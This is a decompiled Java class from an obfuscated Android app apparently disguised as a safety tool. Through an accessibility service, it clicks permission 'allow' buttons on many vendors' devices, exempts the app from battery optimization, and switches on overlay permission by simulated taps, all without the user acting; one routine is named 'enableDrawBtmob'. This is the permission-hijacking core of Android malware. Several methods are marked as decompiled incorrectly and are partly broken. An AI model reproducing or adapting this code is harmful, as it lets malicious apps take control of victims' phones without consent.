package com.storm.safe.rock.service.modules.yw5xud;

import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.R$string;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.util.StringUtil;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.text.AbstractC0779a1;
import okio.internal.Buffer;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.C1351vv;
import p000.b81;
import p000.dh0;
import p000.kg1;
import p000.t60;
import p000.tz0;
import p000.v20;
import p000.w00;
import p000.w20;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.yw5xud.a1 */
/* loaded from: classes2.dex */
public final class C0364a1 {

    /* renamed from: a6 */
    public static final List f55045a6;

    /* renamed from: a7 */
    public static final String[] f55046a7;

    /* renamed from: a0 */
    public final dqtvuisjd f55047a0;

    /* renamed from: a1 */
    public final Context f55048a1;

    /* renamed from: a2 */
    public final String f55049a2;

    /* renamed from: a3 */
    public final w20 f55050a3;

    /* renamed from: a4 */
    public final List f55051a4;

    /* renamed from: a5 */
    public int f55052a5;

    static {
        new v20(null);
        List list = dh0.f55750a0;
        f55045a6 = dh0.f55754a4;
        f55046a7 = (String[]) dh0.f55756a6.toArray(new String[0]);
    }

    public C0364a1(dqtvuisjd dqtvuisjdVar, Context context) {
        t60.m214695b6(dqtvuisjdVar, "service");
        t60.m214695b6(context, "context");
        this.f55047a0 = dqtvuisjdVar;
        this.f55048a1 = context;
        this.f55049a2 = "obzzniixzpin";
        this.f55050a3 = new w20(this);
        this.f55051a4 = AbstractC0716jf.m213306g5("com.android.permissioncontroller:id/permission_allow_button", "com.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.android.permissioncontroller:id/permission_allow_one_time_button", "com.android.packageinstaller:id/permission_allow_always_button", "com.android.packageinstaller:id/permission_allow_foreground_only_button", "com.android.packageinstaller:id/permission_allow_button", "com.google.android.permissioncontroller:id/permission_allow_button", "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.google.android.permissioncontroller:id/permission_allow_one_time_button", "com.samsung.android.packageinstaller:id/permission_allow_button", "com.samsung.android.permissioncontroller:id/permission_allow_button", "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.huawei.systemmanager:id/btn_allow", "com.huawei.packageinstaller:id/permission_allow_button", "com.lbe.security.miui:id/permission_allow_foreground_only_button", "com.miui.securitycenter:id/accept", "miui:id/grant", "miui:id/button2", "miui:id/action_positive", "com.android.settings:id/left_button", "android:id/button1");
    }

    /* renamed from: a1 */
    public static final void m212114a1(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        CharSequence text = accessibilityNodeInfo.getText();
        if (text != null && (string = text.toString()) != null && !AbstractC0779a1.m213663b6(string)) {
            arrayList.add(string);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212114a1(child, arrayList);
            }
        }
    }

    /* renamed from: a3 */
    public static boolean m212115a3(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
            return true;
        }
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        int i = 0;
        while (parent != null && i < 3) {
            if (parent.isClickable() && parent.performAction(16)) {
                return true;
            }
            AccessibilityNodeInfo parent2 = parent.getParent();
            parent.recycle();
            i++;
            parent = parent2;
        }
        return false;
    }

    /* renamed from: b7 */
    public static final void m212116b7(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        if (i > 15) {
            return;
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "Switch", false) || AbstractC0779a1.m213652a5(string, "Toggle", false) || AbstractC0779a1.m213652a5(string, "CheckBox", false) || AbstractC0779a1.m213652a5(string, "CompoundButton", false)) && accessibilityNodeInfo.isVisibleToUser()) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m212116b7(i + 1, child, arrayList);
            }
        }
    }

    /* renamed from: b8 */
    public static final AccessibilityNodeInfo m212117b8(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        AccessibilityNodeInfo accessibilityNodeInfoM212117b8;
        String string;
        if (i > 15) {
            return null;
        }
        if (accessibilityNodeInfo.isCheckable() && accessibilityNodeInfo.isVisibleToUser()) {
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            if (AbstractC0779a1.m213652a5(string, "Switch", true) || AbstractC0779a1.m213652a5(string, "Toggle", true) || AbstractC0779a1.m213652a5(string, "CheckBox", true) || AbstractC0779a1.m213652a5(string, "Compound", true)) {
                return accessibilityNodeInfo;
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null && (accessibilityNodeInfoM212117b8 = m212117b8(child, i + 1)) != null) {
                return accessibilityNodeInfoM212117b8;
            }
        }
        return null;
    }

    /* renamed from: b9 */
    public static final void m212118b9(int i, AccessibilityNodeInfo accessibilityNodeInfo, String str, ArrayList arrayList) {
        if (i > 15) {
            return;
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (t60.m214686a2(className != null ? className.toString() : null, str) && accessibilityNodeInfo.isVisibleToUser()) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m212118b9(i + 1, child, str, arrayList);
            }
        }
    }

    /* renamed from: c0 */
    public static AccessibilityNodeInfo m212119c0(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212119c0;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "Switch", true) || AbstractC0779a1.m213652a5(string, "Toggle", true)) && accessibilityNodeInfo.isVisibleToUser()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212119c0 = m212119c0(child)) != null) {
                return accessibilityNodeInfoM212119c0;
            }
        }
        return null;
    }

    /* renamed from: c4 */
    public static boolean m212120c4() {
        String str = Build.BRAND;
        t60.m214694b5(str, "BRAND");
        Locale locale = Locale.ROOT;
        t60.m214694b5(locale, "ROOT");
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(locale)");
        String str2 = Build.MANUFACTURER;
        t60.m214694b5(str2, "MANUFACTURER");
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(locale)");
        return AbstractC0716jf.m213306g5("xiaomi", "redmi", "poco").contains(lowerCase) || AbstractC0716jf.m213306g5("xiaomi", "redmi", "poco").contains(lowerCase2);
    }

    /* renamed from: c6 */
    public static final boolean m212121c6(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo.isScrollable()) {
            return accessibilityNodeInfo.performAction(Buffer.SEGMENTING_THRESHOLD);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && m212121c6(child)) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: a0 */
    public final boolean m212122a0() {
        AccessibilityNodeInfo rootInActiveWindow = this.f55047a0.getRootInActiveWindow();
        String str = this.f55049a2;
        if (rootInActiveWindow == null) {
            t60.m214704c5(str, "[通用] rootNode为null");
            return false;
        }
        ArrayList arrayList = new ArrayList();
        m212114a1(rootInActiveWindow, arrayList);
        arrayList.isEmpty();
        Iterator it = this.f55051a4.iterator();
        while (it.hasNext()) {
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId((String) it.next());
                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByViewId) {
                        try {
                            accessibilityNodeInfo.performAction(16);
                            accessibilityNodeInfo.recycle();
                            return true;
                        } catch (Exception unused) {
                        }
                    }
                }
            } catch (Exception e) {
                tz0.m214810b0("[通用] ViewID查找异常: ", e.getMessage(), str);
            }
        }
        Iterator it2 = ((List) AbstractC0363a0.f55044a0.getValue()).iterator();
        while (it2.hasNext()) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it2.next());
            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText) {
                    if (!accessibilityNodeInfo2.isVisibleToUser()) {
                        accessibilityNodeInfo2.recycle();
                    } else {
                        if (accessibilityNodeInfo2.isClickable() && accessibilityNodeInfo2.performAction(16)) {
                            return true;
                        }
                        AccessibilityNodeInfo parent = accessibilityNodeInfo2.getParent();
                        int i = 0;
                        while (parent != null && i < 5) {
                            if (parent.isClickable() && parent.performAction(16)) {
                                return true;
                            }
                            AccessibilityNodeInfo parent2 = parent.getParent();
                            parent.recycle();
                            i++;
                            parent = parent2;
                        }
                        accessibilityNodeInfo2.recycle();
                    }
                }
            }
        }
        t60.m214726f4(str, "[通用] 未找到允许按钮");
        return false;
    }

    /* renamed from: a2 */
    public final void m212123a2(int i, int i2) {
        try {
            Path path = new Path();
            path.moveTo(i, i2);
            this.f55047a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L)).build(), null, null);
        } catch (Exception unused) {
        }
    }

    /* renamed from: a4 */
    public final boolean m212124a4(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String string;
        CharSequence text = accessibilityNodeInfo.getText();
        if (text == null || (string = text.toString()) == null) {
            string = "";
        }
        if (string.equalsIgnoreCase(str)) {
            Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
            m212123a2(rectM24a5.left, rectM24a5.centerY());
            return true;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && m212124a4(child, str)) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: a5 */
    public final void m212125a5() {
        Context context = this.f55048a1;
        Object systemService = context.getSystemService("power");
        t60.m214693b4(systemService, "null cannot be cast to non-null type android.os.PowerManager");
        if (((PowerManager) systemService).isIgnoringBatteryOptimizations(context.getPackageName())) {
            return;
        }
        List<String> list = dh0.f55766b6;
        String str = "[电池优化] clikbtry: lang=" + Locale.getDefault().getLanguage() + ", keywords=" + list.size();
        String str2 = this.f55049a2;
        t60.m214704c5(str2, str);
        AccessibilityNodeInfo rootInActiveWindow = this.f55047a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return;
        }
        for (String str3 : list) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str3);
            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                Rect rectM24a5 = AbstractC0003a2.m24a5(listFindAccessibilityNodeInfosByText.get(0));
                int iCenterX = rectM24a5.centerX();
                int iCenterY = rectM24a5.centerY();
                StringBuilder sbM40c1 = AbstractC0003a2.m40c1("[电池优化] 找到'", str3, "'，坐标点击(", iCenterX, ", ");
                sbM40c1.append(iCenterY);
                sbM40c1.append(")");
                t60.m214704c5(str2, sbM40c1.toString());
                m212123a2(rectM24a5.centerX(), rectM24a5.centerY());
                return;
            }
        }
        t60.m214704c5(str2, "[电池优化] 未找到任何无限制关键词");
    }

    /* JADX WARN: Code restructure failed: missing block: B:108:0x02a1, code lost:
    
        r20 = r3;
     */
    /* JADX WARN: Code restructure failed: missing block: B:110:0x02a7, code lost:
    
        if (r11 != false) goto L127;
     */
    /* JADX WARN: Code restructure failed: missing block: B:111:0x02a9, code lost:
    
        r0 = p000.AbstractC0716jf.m213306g5("android.widget.Switch", "androidx.appcompat.widget.SwitchCompat", "miui.widget.SlidingButton", "com.android.settings.widget.ToggleSwitch", "com.samsung.android.settingslib.widget.MainSwitchBar", "android.widget.ToggleButton", "android.widget.CompoundButton", "android.widget.CheckBox").iterator();
     */
    /* JADX WARN: Code restructure failed: missing block: B:113:0x02c9, code lost:
    
        if (r0.hasNext() == false) goto L183;
     */
    /* JADX WARN: Code restructure failed: missing block: B:114:0x02cb, code lost:
    
        r1 = (java.lang.String) r0.next();
        r3 = new java.util.ArrayList();
        m212118b9(0, r8, r1, r3);
        r9 = r3.size();
        r10 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:115:0x02df, code lost:
    
        if (r10 >= r9) goto L186;
     */
    /* JADX WARN: Code restructure failed: missing block: B:116:0x02e1, code lost:
    
        r14 = r3.get(r10);
        r10 = r10 + 1;
        r14 = (android.view.accessibility.AccessibilityNodeInfo) r14;
     */
    /* JADX WARN: Code restructure failed: missing block: B:117:0x02ed, code lost:
    
        if (r14.isCheckable() == false) goto L193;
     */
    /* JADX WARN: Code restructure failed: missing block: B:119:0x02f3, code lost:
    
        if (r14.isChecked() != false) goto L194;
     */
    /* JADX WARN: Code restructure failed: missing block: B:120:0x02f5, code lost:
    
        r14 = p000.AbstractC0003a2.m24a5(r14);
     */
    /* JADX WARN: Code restructure failed: missing block: B:121:0x02fd, code lost:
    
        if (r14.width() <= 0) goto L195;
     */
    /* JADX WARN: Code restructure failed: missing block: B:123:0x0303, code lost:
    
        if (r14.height() > 0) goto L191;
     */
    /* JADX WARN: Code restructure failed: missing block: B:125:0x0306, code lost:
    
        r3 = r14.centerX();
        r9 = r14.centerY();
        r1 = p000.AbstractC0003a2.m40c1("[悬浮窗] 找到未选中开关(", r1, ")，坐标点击(", r3, ", ");
        r1.append(r9);
        r1.append(")");
        p000.t60.m214704c5(r7, r1.toString());
        r6.m212123a2(r14.centerX(), r14.centerY());
        r11 = r17;
     */
    /* JADX WARN: Code restructure failed: missing block: B:126:0x032e, code lost:
    
        if (r11 == false) goto L187;
     */
    /* JADX WARN: Code restructure failed: missing block: B:127:0x0330, code lost:
    
        if (r11 != false) goto L137;
     */
    /* JADX WARN: Code restructure failed: missing block: B:128:0x0332, code lost:
    
        r0 = m212117b8(r8, 0);
     */
    /* JADX WARN: Code restructure failed: missing block: B:129:0x0337, code lost:
    
        if (r0 == null) goto L137;
     */
    /* JADX WARN: Code restructure failed: missing block: B:131:0x033d, code lost:
    
        if (r0.isChecked() != false) goto L137;
     */
    /* JADX WARN: Code restructure failed: missing block: B:132:0x033f, code lost:
    
        r1 = p000.AbstractC0003a2.m24a5(r0);
     */
    /* JADX WARN: Code restructure failed: missing block: B:133:0x0347, code lost:
    
        if (r1.width() <= 0) goto L137;
     */
    /* JADX WARN: Code restructure failed: missing block: B:135:0x034d, code lost:
    
        if (r1.height() <= 0) goto L137;
     */
    /* JADX WARN: Code restructure failed: missing block: B:136:0x034f, code lost:
    
        r0 = r0.getClassName();
        p000.t60.m214704c5(r7, "[悬浮窗] 策略3: 找到可勾选节点(" + ((java.lang.Object) r0) + ")，坐标点击(" + r1.centerX() + ", " + r1.centerY() + ")");
        r6.m212123a2(r1.centerX(), r1.centerY());
        r11 = r17;
     */
    /* JADX WARN: Code restructure failed: missing block: B:137:0x0388, code lost:
    
        if (r11 == false) goto L159;
     */
    /* JADX WARN: Code restructure failed: missing block: B:138:0x038a, code lost:
    
        r4.f53883a0 = r6;
        r4.f53884a1 = r2;
        r4.f53887a4 = 4;
     */
    /* JADX WARN: Code restructure failed: missing block: B:139:0x0397, code lost:
    
        if (p000.b81.m210571b1(1500, r4) != r5) goto L141;
     */
    /* JADX WARN: Code restructure failed: missing block: B:141:0x039b, code lost:
    
        r0 = r2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:159:0x03f8, code lost:
    
        p000.t60.m214704c5(r7, "[悬浮窗] 未找到未选中开关，滚动后重试");
        m212121c6(r8);
        r4.f53883a0 = r6;
        r4.f53884a1 = r2;
        r4.f53887a4 = 8;
     */
    /* JADX WARN: Code restructure failed: missing block: B:160:0x040e, code lost:
    
        if (p000.b81.m210571b1(500, r4) != r5) goto L162;
     */
    /* JADX WARN: Code restructure failed: missing block: B:162:0x0411, code lost:
    
        r0 = r2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:60:0x017c, code lost:
    
        if (r6.m212126a6(r0 + 1, r4) != r5) goto L26;
     */
    /* JADX WARN: Removed duplicated region for block: B:151:0x03ce  */
    /* JADX WARN: Removed duplicated region for block: B:153:0x03d4  */
    /* JADX WARN: Removed duplicated region for block: B:165:0x0421 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:171:0x02a4 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:200:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:52:0x014d  */
    /* JADX WARN: Removed duplicated region for block: B:66:0x018e  */
    /* JADX WARN: Removed duplicated region for block: B:72:0x01bb  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001b  */
    /* renamed from: a6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212126a6(int i, ContinuationImpl continuationImpl) throws Throwable {
        GenericSteps$enableDrawBtmob$1 genericSteps$enableDrawBtmob$1;
        AccessibilityNodeInfo rootInActiveWindow;
        C0364a1 c0364a1;
        C0364a1 c0364a12;
        AccessibilityNodeInfo rootInActiveWindow2;
        Iterator it;
        boolean z;
        C1351vv c1351vv;
        int i2;
        C1351vv c1351vv2;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId;
        Context context;
        int i3 = i;
        C1351vv c1351vv3 = C1351vv.f60710b1;
        if (continuationImpl instanceof GenericSteps$enableDrawBtmob$1) {
            genericSteps$enableDrawBtmob$1 = (GenericSteps$enableDrawBtmob$1) continuationImpl;
            int i4 = genericSteps$enableDrawBtmob$1.f53887a4;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                genericSteps$enableDrawBtmob$1.f53887a4 = i4 - Integer.MIN_VALUE;
            } else {
                genericSteps$enableDrawBtmob$1 = new GenericSteps$enableDrawBtmob$1(this, continuationImpl);
            }
        }
        Object obj = genericSteps$enableDrawBtmob$1.f53885a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        boolean z2 = true;
        switch (genericSteps$enableDrawBtmob$1.f53887a4) {
            case 0:
                kg1.m213544f4(obj);
                if (i3 <= 20 && !Settings.canDrawOverlays(this.f55048a1) && (rootInActiveWindow = this.f55047a0.getRootInActiveWindow()) != null) {
                    String lowerCase = m212137c1().toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    String str = this.f55049a2;
                    t60.m214704c5(str, "[悬浮窗] enableDraw retry=" + i3 + ", appLabel='" + lowerCase + "'");
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(lowerCase);
                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty() && i3 == 0) {
                        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                            if (accessibilityNodeInfo.isVisibleToUser()) {
                                Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
                                Rect rect = new Rect();
                                rootInActiveWindow.getBoundsInScreen(rect);
                                if (rect.contains(rectM24a5)) {
                                    int iCenterX = rectM24a5.centerX();
                                    int iCenterY = rectM24a5.centerY();
                                    StringBuilder sbM40c1 = AbstractC0003a2.m40c1("[悬浮窗] 找到App名字'", lowerCase, "'，点击坐标(", iCenterX, ", ");
                                    sbM40c1.append(iCenterY);
                                    sbM40c1.append(")");
                                    t60.m214704c5(str, sbM40c1.toString());
                                    m212123a2(rectM24a5.centerX(), rectM24a5.centerY());
                                    genericSteps$enableDrawBtmob$1.f53883a0 = this;
                                    genericSteps$enableDrawBtmob$1.f53884a1 = i3;
                                    genericSteps$enableDrawBtmob$1.f53887a4 = 1;
                                    if (b81.m210571b1(1500L, genericSteps$enableDrawBtmob$1) != coroutineSingletons) {
                                        c0364a1 = this;
                                        if (Settings.canDrawOverlays(c0364a1.f55048a1)) {
                                            t60.m214704c5(c0364a1.f55049a2, "[悬浮窗] ✅ 点击App名后权限已授予");
                                            return c1351vv3;
                                        }
                                        int i5 = i3;
                                        String str2 = c0364a1.f55049a2;
                                        if (!Settings.canDrawOverlays(c0364a1.f55048a1) && (rootInActiveWindow2 = c0364a1.f55047a0.getRootInActiveWindow()) != null) {
                                            it = AbstractC0716jf.m213306g5("com.android.settings:id/switch_widget", "com.android.settings:id/switchWidget", "android:id/switch_widget", "android:id/checkbox", "com.android.settings:id/switch_bar", "com.android.settings:id/switch_text", "com.samsung.android.settings:id/switch_widget").iterator();
                                            boolean z3 = false;
                                            while (true) {
                                                if (it.hasNext()) {
                                                    z = z2;
                                                    break;
                                                } else {
                                                    z = z2;
                                                    String str3 = (String) it.next();
                                                    if (z3) {
                                                        break;
                                                    } else {
                                                        try {
                                                            listFindAccessibilityNodeInfosByViewId = rootInActiveWindow2.findAccessibilityNodeInfosByViewId(str3);
                                                        } catch (Exception e) {
                                                            e = e;
                                                            c1351vv2 = c1351vv3;
                                                        }
                                                        if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                                                            Iterator<AccessibilityNodeInfo> it2 = listFindAccessibilityNodeInfosByViewId.iterator();
                                                            while (it2.hasNext()) {
                                                                AccessibilityNodeInfo next = it2.next();
                                                                if (next.isVisibleToUser()) {
                                                                    Iterator<AccessibilityNodeInfo> it3 = it2;
                                                                    Rect rect2 = new Rect();
                                                                    next.getBoundsInScreen(rect2);
                                                                    if (rect2.width() > 0 && rect2.height() > 0) {
                                                                        if (next.isCheckable() && next.isChecked()) {
                                                                            t60.m214704c5(str2, "[悬浮窗] 开关已选中(viewId=" + str3 + ")，无需操作");
                                                                        } else {
                                                                            int iCenterX2 = rect2.centerX();
                                                                            int iCenterY2 = rect2.centerY();
                                                                            StringBuilder sb = new StringBuilder();
                                                                            c1351vv2 = c1351vv3;
                                                                            try {
                                                                                sb.append("[悬浮窗] 通过ViewID找到开关(");
                                                                                sb.append(str3);
                                                                                sb.append(")，坐标点击(");
                                                                                sb.append(iCenterX2);
                                                                                sb.append(", ");
                                                                                sb.append(iCenterY2);
                                                                                sb.append(")");
                                                                                t60.m214704c5(str2, sb.toString());
                                                                                c0364a1.m212123a2(rect2.centerX(), rect2.centerY());
                                                                                z3 = z;
                                                                                z2 = z3;
                                                                            } catch (Exception e2) {
                                                                                e = e2;
                                                                                t60.m214704c5(str2, "[悬浮窗] ViewID(" + str3 + ")查找异常: " + e.getMessage());
                                                                                z2 = z;
                                                                                c1351vv3 = c1351vv2;
                                                                            }
                                                                            c1351vv3 = c1351vv2;
                                                                        }
                                                                    }
                                                                    it2 = it3;
                                                                }
                                                            }
                                                        }
                                                        c1351vv2 = c1351vv3;
                                                        z2 = z;
                                                        c1351vv3 = c1351vv2;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                } else {
                                    t60.m214704c5(str, "[悬浮窗] App名字不在可视区域，滚动后重试");
                                    m212121c6(rootInActiveWindow);
                                    genericSteps$enableDrawBtmob$1.f53883a0 = this;
                                    genericSteps$enableDrawBtmob$1.f53884a1 = i3;
                                    genericSteps$enableDrawBtmob$1.f53887a4 = 2;
                                    if (b81.m210571b1(800L, genericSteps$enableDrawBtmob$1) != coroutineSingletons) {
                                        c0364a12 = this;
                                        genericSteps$enableDrawBtmob$1.f53883a0 = null;
                                        genericSteps$enableDrawBtmob$1.f53887a4 = 3;
                                        break;
                                    }
                                }
                                return coroutineSingletons;
                            }
                        }
                    }
                    c0364a1 = this;
                    int i52 = i3;
                    String str22 = c0364a1.f55049a2;
                    if (!Settings.canDrawOverlays(c0364a1.f55048a1)) {
                        it = AbstractC0716jf.m213306g5("com.android.settings:id/switch_widget", "com.android.settings:id/switchWidget", "android:id/switch_widget", "android:id/checkbox", "com.android.settings:id/switch_bar", "com.android.settings:id/switch_text", "com.samsung.android.settings:id/switch_widget").iterator();
                        boolean z32 = false;
                        while (true) {
                            if (it.hasNext()) {
                            }
                            c1351vv3 = c1351vv2;
                        }
                    }
                }
                return c1351vv3;
            case 1:
                i3 = genericSteps$enableDrawBtmob$1.f53884a1;
                c0364a1 = genericSteps$enableDrawBtmob$1.f53883a0;
                kg1.m213544f4(obj);
                if (Settings.canDrawOverlays(c0364a1.f55048a1)) {
                }
                int i522 = i3;
                String str222 = c0364a1.f55049a2;
                if (!Settings.canDrawOverlays(c0364a1.f55048a1)) {
                }
                return c1351vv3;
            case 2:
                i3 = genericSteps$enableDrawBtmob$1.f53884a1;
                c0364a12 = genericSteps$enableDrawBtmob$1.f53883a0;
                kg1.m213544f4(obj);
                genericSteps$enableDrawBtmob$1.f53883a0 = null;
                genericSteps$enableDrawBtmob$1.f53887a4 = 3;
                break;
            case 3:
                kg1.m213544f4(obj);
                return c1351vv3;
            case 4:
                i2 = genericSteps$enableDrawBtmob$1.f53884a1;
                c0364a1 = genericSteps$enableDrawBtmob$1.f53883a0;
                kg1.m213544f4(obj);
                c1351vv = c1351vv3;
                Context context2 = c0364a1.f55048a1;
                String str4 = c0364a1.f55049a2;
                if (Settings.canDrawOverlays(context2)) {
                    t60.m214704c5(str4, "[悬浮窗] ✅ 点击开关后权限已授予");
                    return c1351vv;
                }
                t60.m214704c5(str4, "[悬浮窗] 权限未立即生效，尝试点击确认对话框...");
                c0364a1.m212122a0();
                genericSteps$enableDrawBtmob$1.f53883a0 = c0364a1;
                genericSteps$enableDrawBtmob$1.f53884a1 = i2;
                genericSteps$enableDrawBtmob$1.f53887a4 = 5;
                if (b81.m210571b1(1500L, genericSteps$enableDrawBtmob$1) != coroutineSingletons) {
                    context = c0364a1.f55048a1;
                    String str5 = c0364a1.f55049a2;
                    if (!Settings.canDrawOverlays(context)) {
                        t60.m214704c5(str5, "[悬浮窗] ✅ 点击确认对话框后权限已授予");
                        return c1351vv;
                    }
                    t60.m214704c5(str5, "[悬浮窗] 开关已点击但权限未生效，重试...");
                    genericSteps$enableDrawBtmob$1.f53883a0 = c0364a1;
                    genericSteps$enableDrawBtmob$1.f53884a1 = i2;
                    genericSteps$enableDrawBtmob$1.f53887a4 = 6;
                    if (b81.m210571b1(500L, genericSteps$enableDrawBtmob$1) != coroutineSingletons) {
                        genericSteps$enableDrawBtmob$1.f53883a0 = null;
                        genericSteps$enableDrawBtmob$1.f53887a4 = 7;
                        if (c0364a1.m212126a6(i2 + 1, genericSteps$enableDrawBtmob$1) != coroutineSingletons) {
                            return c1351vv;
                        }
                    }
                }
                return coroutineSingletons;
            case 5:
                i2 = genericSteps$enableDrawBtmob$1.f53884a1;
                c0364a1 = genericSteps$enableDrawBtmob$1.f53883a0;
                kg1.m213544f4(obj);
                c1351vv = c1351vv3;
                context = c0364a1.f55048a1;
                String str52 = c0364a1.f55049a2;
                if (!Settings.canDrawOverlays(context)) {
                }
                break;
            case 6:
                i2 = genericSteps$enableDrawBtmob$1.f53884a1;
                c0364a1 = genericSteps$enableDrawBtmob$1.f53883a0;
                kg1.m213544f4(obj);
                c1351vv = c1351vv3;
                genericSteps$enableDrawBtmob$1.f53883a0 = null;
                genericSteps$enableDrawBtmob$1.f53887a4 = 7;
                if (c0364a1.m212126a6(i2 + 1, genericSteps$enableDrawBtmob$1) != coroutineSingletons) {
                    return coroutineSingletons;
                }
                break;
            case 7:
                kg1.m213544f4(obj);
                return c1351vv3;
            case 8:
                int i6 = genericSteps$enableDrawBtmob$1.f53884a1;
                c0364a1 = genericSteps$enableDrawBtmob$1.f53883a0;
                kg1.m213544f4(obj);
                c1351vv = c1351vv3;
                genericSteps$enableDrawBtmob$1.f53883a0 = null;
                genericSteps$enableDrawBtmob$1.f53887a4 = 9;
                if (c0364a1.m212126a6(i6 + 1, genericSteps$enableDrawBtmob$1) != coroutineSingletons) {
                    return c1351vv;
                }
                break;
            case 9:
                kg1.m213544f4(obj);
                return c1351vv3;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

